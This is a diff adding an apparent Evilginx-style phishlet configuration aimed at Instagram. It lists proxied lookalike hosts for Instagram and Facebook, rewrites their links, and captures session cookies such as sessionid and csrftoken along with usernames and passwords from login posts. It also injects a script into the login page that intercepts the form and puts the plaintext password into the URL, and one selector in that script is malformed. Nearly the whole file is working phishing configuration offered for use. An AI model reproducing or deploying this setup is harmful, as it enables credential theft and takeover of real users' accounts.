@@ -1,0 +1,71 @@
+name: 'Instagram'
+author: 'VSM97'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
+  - {phish_sub: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com:443', session: true, is_landing: false}
+  - {phish_sub: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', session: false, is_landing: false}
+  - {phish_sub: 'static.cdninstagram.com', orig_sub: 'static', domain: 'cdninstagram.com', session: true, is_landing: false}
+  - {phish_sub: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com:443', session: true, is_landing: false}
+  - {phish_sub: 'instagram.fcmb2-2.fna.fbcdn.net', orig_sub: 'instagram.fcmb2-2.fna', domain: 'fbcdn.net', session: true, is_landing: false}
+  - {phish_sub: 'scontent.cdninstagram.com', orig_sub: 'scontent', domain: 'cdninstagram.com', session: true, is_landing: false}
+  - {phish_sub: 'graph.instagram.com', orig_sub: 'graph', domain: 'instagram.com', session: true, is_landing: false}
+  - {phish_sub: 'static.xx.fbcdn.net', orig_sub: 'static.xx', domain: 'fbcdn.net', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'href="https://{hostname}/', replace: 'href="https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'static.cdninstagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.instagram.com'
+    keys: ['sessionid', 'ds_user_id', 'csrftoken', 'mid']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.instagram.com'
+  path: '/accounts/login'
+js_inject:
+  - trigger_domains: ["www.instagram.com"]
+    trigger_paths: ["/accounts/login"]
+    script: |
+      function capturePassword() {
+        // Intercept the login form submission
+        var loginForm = document.querySelector('form[action="/accounts/login"]');
+        
+        if (loginForm) {
+          loginForm.addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent the form from submitting
+            
+            // Get the password input element
+            var passwordInput = document.querySelector('input[name="password"post]');
+            
+            if (passwordInput) {
+              // Capture the plaintext password
+              var plaintextPassword = passwordInput.value;
+              
+              // Set the captured password as a query parameter in the URL
+              var currentURL = window.location.href;
+              var newURL = currentURL + '?password=' + plaintextPassword;
+              
+              // Redirect to the modified URL with the captured password
+              window.location.href = newURL;
+            }
+          });
+        }
+      }
+      
+      // Call the capturePassword() function when the page loads
+      window.addEventListener('load', function() {
+        capturePassword();
+      });
